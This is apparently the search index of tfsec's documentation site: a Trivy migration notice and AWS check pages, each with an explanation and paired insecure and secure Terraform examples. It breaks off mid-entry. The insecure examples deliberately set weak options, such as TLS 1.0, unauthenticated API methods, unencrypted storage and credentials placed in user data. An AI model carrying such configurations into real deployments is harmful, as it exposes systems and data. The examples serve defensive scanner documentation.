{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"<p></p> <p> </p>","title":"HOME"},{"location":"#tfsec-to-trivy-migration","text":"<p>As part of our goal to provide a comprehensive open source security solution for all, we have been consolidating all of our scanning-related efforts in one place, and that is Trivy. </p> <p>Over the past year, tfsec has laid the foundations to Trivy's IaC &amp; misconfigurations scanning capabilities, including Terraform scanning, which has been natively supported in Trivy for a long time now.</p> <p>Going forward we want to encourage the tfsec community to transition over to Trivy. Moving to Trivy gives you the same excellent Terraform scanning engine, with some extra benefits:</p> <ol> <li>Access to more languages and features in the same tool.</li> <li>Access to more integrations with tools and services through the rich ecosystem around Trivy.</li> <li>Commercially supported by Aqua as well as by a the passionate Trivy community. tfsec will continue to remain available for the time being, although our engineering attention will be directed at Trivy going forward.</li> </ol>","title":"\ud83d\udce3 tfsec to Trivy Migration"},{"location":"#tfsec-to-trivy-migration-guide","text":"<p>For further information on how Trivy compares to tfsec and moving from tfsec to Trivy, do have a look at the migration guide.</p>","title":"tfsec to Trivy migration guide"},{"location":"#tfsec","text":"<p><code>tfsec</code> is a static analysis security scanner for your Terraform code.</p> <p>Designed to run locally and in your CI pipelines, developer-friendly output and fully documented checks mean detection and remediation can take place as quickly and efficiently as possible</p> <p><code>tfsec</code> takes a developer-first approach to scanning your Terraform templates; using static analysis and deep integration with the official HCL parser it ensures that security issues can be detected before your infrastructure changes take effect.</p> <p> </p>   Demo: Misconfiguration Detection  <p><code>tfsec</code> is an Aqua Security open source project. Learn about our open source work and portfolio here. Contact us about any matter by opening a GitHub Discussion here</p>","title":"tfsec"},{"location":"checks/aws/","text":"","title":"aws"},{"location":"checks/aws/#services","text":"<ul> <li> <p>api-gateway</p> </li> <li> <p>athena</p> </li> <li> <p>cloudfront</p> </li> <li> <p>cloudtrail</p> </li> <li> <p>cloudwatch</p> </li> <li> <p>codebuild</p> </li> <li> <p>config</p> </li> <li> <p>documentdb</p> </li> <li> <p>dynamodb</p> </li> <li> <p>ec2</p> </li> <li> <p>ecr</p> </li> <li> <p>ecs</p> </li> <li> <p>efs</p> </li> <li> <p>eks</p> </li> <li> <p>elastic-search</p> </li> <li> <p>elasticache</p> </li> <li> <p>elb</p> </li> <li> <p>emr</p> </li> <li> <p>iam</p> </li> <li> <p>kinesis</p> </li> <li> <p>kms</p> </li> <li> <p>lambda</p> </li> <li> <p>mq</p> </li> <li> <p>msk</p> </li> <li> <p>neptune</p> </li> <li> <p>rds</p> </li> <li> <p>redshift</p> </li> <li> <p>s3</p> </li> <li> <p>sns</p> </li> <li> <p>sqs</p> </li> <li> <p>ssm</p> </li> <li> <p>workspaces</p> </li> </ul>","title":"Services"},{"location":"checks/aws/api-gateway/","text":"","title":"api-gateway"},{"location":"checks/aws/api-gateway/#checks","text":"<ul> <li> <p>enable-access-logging API Gateway stages for V1 and V2 should have access logging enabled</p> </li> <li> <p>enable-cache-encryption API Gateway must have cache enabled</p> </li> <li> <p>enable-tracing API Gateway must have X-Ray tracing enabled</p> </li> <li> <p>no-public-access No unauthorized access to API Gateway methods</p> </li> <li> <p>use-secure-tls-policy API Gateway domain name uses outdated SSL/TLS protocols.</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/api-gateway/enable-access-logging/","text":"","title":"API Gateway stages for V1 and V2 should have access logging enabled"},{"location":"checks/aws/api-gateway/enable-access-logging/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/api-gateway/enable-access-logging/#explanation","text":"<p>API Gateway stages should have access log settings block configured to track all access to a particular stage. This should be applied to both v1 and v2 gateway stages.</p>","title":"Explanation"},{"location":"checks/aws/api-gateway/enable-access-logging/#possible-impact","text":"<p>Logging provides vital information about access and usage</p>","title":"Possible Impact"},{"location":"checks/aws/api-gateway/enable-access-logging/#suggested-resolution","text":"<p>Enable logging for API Gateway stages</p>","title":"Suggested Resolution"},{"location":"checks/aws/api-gateway/enable-access-logging/#insecure-example","text":"<p>The following example will fail the aws-api-gateway-enable-access-logging check. <pre><code> resource \"aws_apigatewayv2_stage\" \"bad_example\" {\n   api_id = aws_apigatewayv2_api.example.id\n   name   = \"example-stage\"\n }\n\n resource \"aws_apigatewayv2_stage\" \"bad_example\" {\n   deployment_id = aws_api_gateway_deployment.example.id\n   rest_api_id   = aws_api_gateway_rest_api.example.id\n   stage_name    = \"example\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/api-gateway/enable-access-logging/#secure-example","text":"<p>The following example will pass the aws-api-gateway-enable-access-logging check. <pre><code> resource \"aws_apigatewayv2_stage\" \"good_example\" {\n   api_id = aws_apigatewayv2_api.example.id\n   name   = \"example-stage\"\n\n   access_log_settings {\n    destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n    format          = \"json\"\n   }\n }\n\n resource \"aws_api_gateway_stage\" \"good_example\" {\n   deployment_id = aws_api_gateway_deployment.example.id\n   rest_api_id   = aws_api_gateway_rest_api.example.id\n   stage_name    = \"example\"\n\n   access_log_settings {\n     destination_arn = \"arn:aws:logs:region:0123456789:log-group:access_logging\"\n     format          = \"json\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/api-gateway/enable-access-logging/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/apigatewayv2_stage#access_log_settings</p> </li> <li> <p>https://docs.aws.amazon.com/apigateway/latest/developerguide/set-up-logging.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/api-gateway/enable-cache-encryption/","text":"","title":"API Gateway must have cache enabled"},{"location":"checks/aws/api-gateway/enable-cache-encryption/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/api-gateway/enable-cache-encryption/#explanation","text":"<p>Method cache encryption ensures that any sensitive data in the cache is not vulnerable to compromise in the event of interception</p>","title":"Explanation"},{"location":"checks/aws/api-gateway/enable-cache-encryption/#possible-impact","text":"<p>Data stored in the cache that is unencrypted may be vulnerable to compromise</p>","title":"Possible Impact"},{"location":"checks/aws/api-gateway/enable-cache-encryption/#suggested-resolution","text":"<p>Enable cache encryption</p>","title":"Suggested Resolution"},{"location":"checks/aws/api-gateway/enable-cache-encryption/#insecure-example","text":"<p>The following example will fail the aws-api-gateway-enable-cache-encryption check. <pre><code> resource \"aws_api_gateway_rest_api\" \"example\" {\n\n }\n\n resource \"aws_api_gateway_stage\" \"example\" {\n    rest_api_id = aws_api_gateway_rest_api.example.id\n }\n\n resource \"aws_api_gateway_method_settings\" \"bad_example\" {\n   rest_api_id = aws_api_gateway_rest_api.example.id\n   stage_name  = aws_api_gateway_stage.example.stage_name\n   method_path = \"path1/GET\"\n\n   settings {\n     metrics_enabled = true\n     logging_level   = \"INFO\"\n     caching_enabled = true\n     cache_data_encrypted = false\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/api-gateway/enable-cache-encryption/#secure-example","text":"<p>The following example will pass the aws-api-gateway-enable-cache-encryption check. <pre><code> resource \"aws_api_gateway_rest_api\" \"example\" {\n\n }\n\n resource \"aws_api_gateway_stage\" \"example\" {\n\n }\n\n resource \"aws_api_gateway_method_settings\" \"good_example\" {\n   rest_api_id = aws_api_gateway_rest_api.example.id\n   stage_name  = aws_api_gateway_stage.example.stage_name\n   method_path = \"path1/GET\"\n\n   settings {\n     metrics_enabled = true\n     logging_level   = \"INFO\"\n     caching_enabled = true\n     cache_data_encrypted = true\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/api-gateway/enable-cache-encryption/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method_settings#cache_data_encrypted</li> </ul>","title":"Links"},{"location":"checks/aws/api-gateway/enable-tracing/","text":"","title":"API Gateway must have X-Ray tracing enabled"},{"location":"checks/aws/api-gateway/enable-tracing/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/api-gateway/enable-tracing/#explanation","text":"<p>X-Ray tracing enables end-to-end debugging and analysis of all API Gateway HTTP requests.</p>","title":"Explanation"},{"location":"checks/aws/api-gateway/enable-tracing/#possible-impact","text":"<p>Without full tracing enabled it is difficult to trace the flow of logs</p>","title":"Possible Impact"},{"location":"checks/aws/api-gateway/enable-tracing/#suggested-resolution","text":"<p>Enable tracing</p>","title":"Suggested Resolution"},{"location":"checks/aws/api-gateway/enable-tracing/#insecure-example","text":"<p>The following example will fail the aws-api-gateway-enable-tracing check. <pre><code> resource \"aws_api_gateway_rest_api\" \"test\" {\n\n }\n\n resource \"aws_api_gateway_stage\" \"bad_example\" {\n   stage_name    = \"prod\"\n   rest_api_id   = aws_api_gateway_rest_api.test.id\n   deployment_id = aws_api_gateway_deployment.test.id\n   xray_tracing_enabled = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/api-gateway/enable-tracing/#secure-example","text":"<p>The following example will pass the aws-api-gateway-enable-tracing check. <pre><code> resource \"aws_api_gateway_rest_api\" \"test\" {\n\n }\n\n resource \"aws_api_gateway_stage\" \"good_example\" {\n   stage_name    = \"prod\"\n   rest_api_id   = aws_api_gateway_rest_api.test.id\n   deployment_id = aws_api_gateway_deployment.test.id\n   xray_tracing_enabled = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/api-gateway/enable-tracing/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_stage#xray_tracing_enabled</li> </ul>","title":"Links"},{"location":"checks/aws/api-gateway/no-public-access/","text":"","title":"No unauthorized access to API Gateway methods"},{"location":"checks/aws/api-gateway/no-public-access/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/api-gateway/no-public-access/#explanation","text":"<p>API Gateway methods should generally be protected by authorization or api key. OPTION verb calls can be used without authorization</p>","title":"Explanation"},{"location":"checks/aws/api-gateway/no-public-access/#possible-impact","text":"<p>API gateway methods can be accessed without authorization.</p>","title":"Possible Impact"},{"location":"checks/aws/api-gateway/no-public-access/#suggested-resolution","text":"<p>Use and authorization method or require API Key</p>","title":"Suggested Resolution"},{"location":"checks/aws/api-gateway/no-public-access/#insecure-example","text":"<p>The following example will fail the aws-api-gateway-no-public-access check. <pre><code> resource \"aws_api_gateway_rest_api\" \"MyDemoAPI\" {\n\n }\n\n resource \"aws_api_gateway_resource\" \"MyDemoResource\" {\n    rest_api_id      = aws_api_gateway_rest_api.MyDemoAPI.id\n }\n\n resource \"aws_api_gateway_method\" \"bad_example\" {\n   rest_api_id   = aws_api_gateway_rest_api.MyDemoAPI.id\n   resource_id   = aws_api_gateway_resource.MyDemoResource.id\n   http_method   = \"GET\"\n   authorization = \"NONE\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/api-gateway/no-public-access/#secure-example","text":"<p>The following example will pass the aws-api-gateway-no-public-access check. <pre><code> resource \"aws_api_gateway_rest_api\" \"MyDemoAPI\" {\n\n }\n\n resource \"aws_api_gateway_resource\" \"MyDemoResource\" {\n    rest_api_id      = aws_api_gateway_rest_api.MyDemoAPI.id\n }\n\n resource \"aws_api_gateway_method\" \"good_example\" {\n   rest_api_id   = aws_api_gateway_rest_api.MyDemoAPI.id\n   resource_id   = aws_api_gateway_resource.MyDemoResource.id\n   http_method   = \"GET\"\n   authorization = \"AWS_IAM\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/api-gateway/no-public-access/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_method#authorization</li> </ul>","title":"Links"},{"location":"checks/aws/api-gateway/use-secure-tls-policy/","text":"","title":"API Gateway domain name uses outdated SSL/TLS protocols."},{"location":"checks/aws/api-gateway/use-secure-tls-policy/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/api-gateway/use-secure-tls-policy/#explanation","text":"<p>You should not use outdated/insecure TLS versions for encryption. You should be using TLS v1.2+.</p>","title":"Explanation"},{"location":"checks/aws/api-gateway/use-secure-tls-policy/#possible-impact","text":"<p>Outdated SSL policies increase exposure to known vulnerabilities</p>","title":"Possible Impact"},{"location":"checks/aws/api-gateway/use-secure-tls-policy/#suggested-resolution","text":"<p>Use the most modern TLS/SSL policies available</p>","title":"Suggested Resolution"},{"location":"checks/aws/api-gateway/use-secure-tls-policy/#insecure-example","text":"<p>The following example will fail the aws-api-gateway-use-secure-tls-policy check. <pre><code> resource \"aws_api_gateway_domain_name\" \"bad_example\" {\n    security_policy = \"TLS_1_0\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/api-gateway/use-secure-tls-policy/#secure-example","text":"<p>The following example will pass the aws-api-gateway-use-secure-tls-policy check. <pre><code> resource \"aws_api_gateway_domain_name\" \"good_example\" {\n    security_policy = \"TLS_1_2\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/api-gateway/use-secure-tls-policy/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/api_gateway_domain_name#security_policy</p> </li> <li> <p>https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-custom-domain-tls-version.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/athena/","text":"","title":"athena"},{"location":"checks/aws/athena/#checks","text":"<ul> <li> <p>enable-at-rest-encryption Athena databases and workgroup configurations are created unencrypted at rest by default, they should be encrypted</p> </li> <li> <p>no-encryption-override Athena workgroups should enforce configuration to prevent client disabling encryption</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/athena/enable-at-rest-encryption/","text":"","title":"Athena databases and workgroup configurations are created unencrypted at rest by default, they should be encrypted"},{"location":"checks/aws/athena/enable-at-rest-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/athena/enable-at-rest-encryption/#explanation","text":"<p>Athena databases and workspace result sets should be encrypted at rests. These databases and query sets are generally derived from data in S3 buckets and should have the same level of at rest protection.</p>","title":"Explanation"},{"location":"checks/aws/athena/enable-at-rest-encryption/#possible-impact","text":"<p>Data can be read if the Athena Database is compromised</p>","title":"Possible Impact"},{"location":"checks/aws/athena/enable-at-rest-encryption/#suggested-resolution","text":"<p>Enable encryption at rest for Athena databases and workgroup configurations</p>","title":"Suggested Resolution"},{"location":"checks/aws/athena/enable-at-rest-encryption/#insecure-example","text":"<p>The following example will fail the aws-athena-enable-at-rest-encryption check. <pre><code> resource \"aws_athena_database\" \"bad_example\" {\n   name   = \"database_name\"\n   bucket = aws_s3_bucket.hoge.bucket\n }\n\n resource \"aws_athena_workgroup\" \"bad_example\" {\n   name = \"example\"\n\n   configuration {\n     enforce_workgroup_configuration    = true\n     publish_cloudwatch_metrics_enabled = true\n\n     result_configuration {\n       output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n     }\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/athena/enable-at-rest-encryption/#secure-example","text":"<p>The following example will pass the aws-athena-enable-at-rest-encryption check. <pre><code> resource \"aws_athena_database\" \"good_example\" {\n   name   = \"database_name\"\n   bucket = aws_s3_bucket.hoge.bucket\n\n   encryption_configuration {\n      encryption_option = \"SSE_KMS\"\n      kms_key_arn       = aws_kms_key.example.arn\n  }\n }\n\n resource \"aws_athena_workgroup\" \"good_example\" {\n   name = \"example\"\n\n   configuration {\n     enforce_workgroup_configuration    = true\n     publish_cloudwatch_metrics_enabled = true\n\n     result_configuration {\n       output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n       encryption_configuration {\n         encryption_option = \"SSE_KMS\"\n         kms_key_arn       = aws_kms_key.example.arn\n       }\n     }\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/athena/enable-at-rest-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#encryption_configuration</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_database#encryption_configuration</p> </li> <li> <p>https://docs.aws.amazon.com/athena/latest/ug/encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/athena/no-encryption-override/","text":"","title":"Athena workgroups should enforce configuration to prevent client disabling encryption"},{"location":"checks/aws/athena/no-encryption-override/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/athena/no-encryption-override/#explanation","text":"<p>Athena workgroup configuration should be enforced to prevent client side changes to disable encryption settings.</p>","title":"Explanation"},{"location":"checks/aws/athena/no-encryption-override/#possible-impact","text":"<p>Clients can ignore encryption requirements</p>","title":"Possible Impact"},{"location":"checks/aws/athena/no-encryption-override/#suggested-resolution","text":"<p>Enforce the configuration to prevent client overrides</p>","title":"Suggested Resolution"},{"location":"checks/aws/athena/no-encryption-override/#insecure-example","text":"<p>The following example will fail the aws-athena-no-encryption-override check. <pre><code> resource \"aws_athena_workgroup\" \"bad_example\" {\n   name = \"example\"\n\n   configuration {\n     enforce_workgroup_configuration    = false\n     publish_cloudwatch_metrics_enabled = true\n\n     result_configuration {\n       output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n       encryption_configuration {\n         encryption_option = \"SSE_KMS\"\n         kms_key_arn       = aws_kms_key.example.arn\n       }\n     }\n   }\n }\n\n resource \"aws_athena_workgroup\" \"bad_example\" {\n   name = \"example\"\n\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/athena/no-encryption-override/#secure-example","text":"<p>The following example will pass the aws-athena-no-encryption-override check. <pre><code> resource \"aws_athena_workgroup\" \"good_example\" {\n   name = \"example\"\n\n   configuration {\n     enforce_workgroup_configuration    = true\n     publish_cloudwatch_metrics_enabled = true\n\n     result_configuration {\n       output_location = \"s3://${aws_s3_bucket.example.bucket}/output/\"\n\n       encryption_configuration {\n         encryption_option = \"SSE_KMS\"\n         kms_key_arn       = aws_kms_key.example.arn\n       }\n     }\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/athena/no-encryption-override/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/athena_workgroup#configuration</p> </li> <li> <p>https://docs.aws.amazon.com/athena/latest/ug/manage-queries-control-costs-with-workgroups.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/autoscaling/","text":"","title":"autoscaling"},{"location":"checks/aws/autoscaling/#checks","text":"<ul> <li> <p>enable-at-rest-encryption Launch configuration with unencrypted block device.</p> </li> <li> <p>enforce-http-token-imds aws_instance should activate session tokens for Instance Metadata Service.</p> </li> <li> <p>no-public-ip Launch configuration should not have a public IP address.</p> </li> <li> <p>no-secrets-in-user-data User data for EC2 instances must not contain sensitive AWS keys</p> </li> <li> <p>no-sensitive-info Ensure all data stored in the launch configuration EBS is securely encrypted</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/autoscaling/enable-at-rest-encryption/","text":"","title":"Launch configuration with unencrypted block device."},{"location":"checks/aws/autoscaling/enable-at-rest-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/autoscaling/enable-at-rest-encryption/#explanation","text":"<p>Block devices should be encrypted to ensure sensitive data is held securely at rest.</p>","title":"Explanation"},{"location":"checks/aws/autoscaling/enable-at-rest-encryption/#possible-impact","text":"<p>The block device could be compromised and read from</p>","title":"Possible Impact"},{"location":"checks/aws/autoscaling/enable-at-rest-encryption/#suggested-resolution","text":"<p>Turn on encryption for all block devices</p>","title":"Suggested Resolution"},{"location":"checks/aws/autoscaling/enable-at-rest-encryption/#insecure-example","text":"<p>The following example will fail the aws-autoscaling-enable-at-rest-encryption check. <pre><code> resource \"aws_launch_configuration\" \"bad_example\" {\n    root_block_device {\n        encrypted = false\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/autoscaling/enable-at-rest-encryption/#secure-example","text":"<p>The following example will pass the aws-autoscaling-enable-at-rest-encryption check. <pre><code> resource \"aws_launch_configuration\" \"good_example\" {\n    root_block_device {\n        encrypted = true\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/autoscaling/enable-at-rest-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/RootDeviceStorage.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/autoscaling/enforce-http-token-imds/","text":"","title":"aws_instance should activate session tokens for Instance Metadata Service."},{"location":"checks/aws/autoscaling/enforce-http-token-imds/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/autoscaling/enforce-http-token-imds/#explanation","text":"<p>IMDS v2 (Instance Metadata Service) introduced session authentication tokens which improve security when talking to IMDS. By default <code>aws_instance</code> resource sets IMDS session auth tokens to be optional.  To fully protect IMDS you need to enable session tokens by using <code>metadata_options</code> block and its <code>http_tokens</code> variable set to <code>required</code>.</p>","title":"Explanation"},{"location":"checks/aws/autoscaling/enforce-http-token-imds/#possible-impact","text":"<p>Instance metadata service can be interacted with freely</p>","title":"Possible Impact"},{"location":"checks/aws/autoscaling/enforce-http-token-imds/#suggested-resolution","text":"<p>Enable HTTP token requirement for IMDS</p>","title":"Suggested Resolution"},{"location":"checks/aws/autoscaling/enforce-http-token-imds/#insecure-example","text":"<p>The following example will fail the aws-autoscaling-enforce-http-token-imds check. <pre><code> resource \"aws_launch_template\" \"bad_example\" {\n     image_id      = \"ami-005e54dee72cc1d00\"\n     instance_type = \"t2.micro\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/autoscaling/enforce-http-token-imds/#secure-example","text":"<p>The following example will pass the aws-autoscaling-enforce-http-token-imds check. <pre><code> resource \"aws_launch_template\" \"good_example\" {\n     image_id      = \"ami-005e54dee72cc1d00\"\n     instance_type = \"t2.micro\"\n     metadata_options {\n       http_tokens = \"required\"\n     }  \n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/autoscaling/enforce-http-token-imds/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options</p> </li> <li> <p>https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service</p> </li> </ul>","title":"Links"},{"location":"checks/aws/autoscaling/no-public-ip/","text":"","title":"Launch configuration should not have a public IP address."},{"location":"checks/aws/autoscaling/no-public-ip/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/autoscaling/no-public-ip/#explanation","text":"<p>You should limit the provision of public IP addresses for resources. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application.</p>","title":"Explanation"},{"location":"checks/aws/autoscaling/no-public-ip/#possible-impact","text":"<p>The instance or configuration is publicly accessible</p>","title":"Possible Impact"},{"location":"checks/aws/autoscaling/no-public-ip/#suggested-resolution","text":"<p>Set the instance to not be publicly accessible</p>","title":"Suggested Resolution"},{"location":"checks/aws/autoscaling/no-public-ip/#insecure-example","text":"<p>The following example will fail the aws-autoscaling-no-public-ip check. <pre><code> resource \"aws_launch_configuration\" \"bad_example\" {\n    associate_public_ip_address = true\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/autoscaling/no-public-ip/#secure-example","text":"<p>The following example will pass the aws-autoscaling-no-public-ip check. <pre><code> resource \"aws_launch_configuration\" \"good_example\" {\n    associate_public_ip_address = false\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/autoscaling/no-public-ip/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#associate_public_ip_address</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#associate_public_ip_address</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/autoscaling/no-secrets-in-user-data/","text":"","title":"User data for EC2 instances must not contain sensitive AWS keys"},{"location":"checks/aws/autoscaling/no-secrets-in-user-data/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/autoscaling/no-secrets-in-user-data/#explanation","text":"<p>EC2 instance data is used to pass start up information into the EC2 instance. This userdata must not contain access key credentials. Instead use an IAM Instance Profile assigned to the instance to grant access to other AWS Services.</p>","title":"Explanation"},{"location":"checks/aws/autoscaling/no-secrets-in-user-data/#possible-impact","text":"<p>User data is visible through the AWS Management console</p>","title":"Possible Impact"},{"location":"checks/aws/autoscaling/no-secrets-in-user-data/#suggested-resolution","text":"<p>Remove sensitive data from the EC2 instance user-data generated by launch templates</p>","title":"Suggested Resolution"},{"location":"checks/aws/autoscaling/no-secrets-in-user-data/#insecure-example","text":"<p>The following example will fail the aws-autoscaling-no-secrets-in-user-data check. <pre><code> resource \"aws_launch_template\" \"bad_example\" {\n\n     image_id      = \"ami-12345667\"\n     instance_type = \"t2.small\"\n\n     user_data = &lt;&lt;EOF\n export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n export AWS_DEFAULT_REGION=us-west-2 \nEOF\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/autoscaling/no-secrets-in-user-data/#secure-example","text":"<p>The following example will pass the aws-autoscaling-no-secrets-in-user-data check. <pre><code> resource \"aws_iam_instance_profile\" \"good_example\" {\n         // ...\n }\n\n resource \"aws_launch_template\" \"good_example\" {\n     image_id      = \"ami-12345667\"\n     instance_type = \"t2.small\"\n\n     iam_instance_profile {\n         name = aws_iam_instance_profile.good_profile.arn\n     }\n     user_data = &lt;&lt;EOF\n     export GREETING=hello\nEOF\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/autoscaling/no-secrets-in-user-data/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-add-user-data.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/autoscaling/no-sensitive-info/","text":"","title":"Ensure all data stored in the launch configuration EBS is securely encrypted"},{"location":"checks/aws/autoscaling/no-sensitive-info/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/autoscaling/no-sensitive-info/#explanation","text":"<p>When creating Launch Configurations, user data can be used for the initial configuration of the instance. User data must not contain any sensitive data.</p>","title":"Explanation"},{"location":"checks/aws/autoscaling/no-sensitive-info/#possible-impact","text":"<p>Sensitive credentials in user data can be leaked</p>","title":"Possible Impact"},{"location":"checks/aws/autoscaling/no-sensitive-info/#suggested-resolution","text":"<p>Don't use sensitive data in user data</p>","title":"Suggested Resolution"},{"location":"checks/aws/autoscaling/no-sensitive-info/#insecure-example","text":"<p>The following example will fail the aws-autoscaling-no-sensitive-info check. <pre><code> resource \"aws_launch_configuration\" \"as_conf\" {\n   name          = \"web_config\"\n   image_id      = data.aws_ami.ubuntu.id\n   instance_type = \"t2.micro\"\n   user_data     = &lt;&lt;EOF\n export DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n EOF\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/autoscaling/no-sensitive-info/#secure-example","text":"<p>The following example will pass the aws-autoscaling-no-sensitive-info check. <pre><code> resource \"aws_launch_configuration\" \"as_conf\" {\n   name          = \"web_config\"\n   image_id      = data.aws_ami.ubuntu.id\n   instance_type = \"t2.micro\"\n   user_data     = &lt;&lt;EOF\n export GREETING=\"Hello there\"\n EOF\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/autoscaling/no-sensitive-info/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#user_data,user_data_base64</li> </ul>","title":"Links"},{"location":"checks/aws/cloudfront/","text":"","title":"cloudfront"},{"location":"checks/aws/cloudfront/#checks","text":"<ul> <li> <p>enable-logging Cloudfront distribution should have Access Logging configured</p> </li> <li> <p>enable-waf CloudFront distribution does not have a WAF in front.</p> </li> <li> <p>enforce-https CloudFront distribution allows unencrypted (HTTP) communications.</p> </li> <li> <p>use-secure-tls-policy CloudFront distribution uses outdated SSL/TLS protocols.</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/cloudfront/enable-logging/","text":"","title":"Cloudfront distribution should have Access Logging configured"},{"location":"checks/aws/cloudfront/enable-logging/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/cloudfront/enable-logging/#explanation","text":"<p>You should configure CloudFront Access Logging to create log files that contain detailed information about every user request that CloudFront receives</p>","title":"Explanation"},{"location":"checks/aws/cloudfront/enable-logging/#possible-impact","text":"<p>Logging provides vital information about access and usage</p>","title":"Possible Impact"},{"location":"checks/aws/cloudfront/enable-logging/#suggested-resolution","text":"<p>Enable logging for CloudFront distributions</p>","title":"Suggested Resolution"},{"location":"checks/aws/cloudfront/enable-logging/#insecure-example","text":"<p>The following example will fail the aws-cloudfront-enable-logging check. <pre><code> resource \"aws_cloudfront_distribution\" \"bad_example\" {\n    // other config\n    // no logging_config\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/cloudfront/enable-logging/#secure-example","text":"<p>The following example will pass the aws-cloudfront-enable-logging check. <pre><code> resource \"aws_cloudfront_distribution\" \"good_example\" {\n    // other config\n    logging_config {\n        include_cookies = false\n        bucket          = \"mylogs.s3.amazonaws.com\"\n        prefix          = \"myprefix\"\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/cloudfront/enable-logging/#links","text":"<ul> <li> 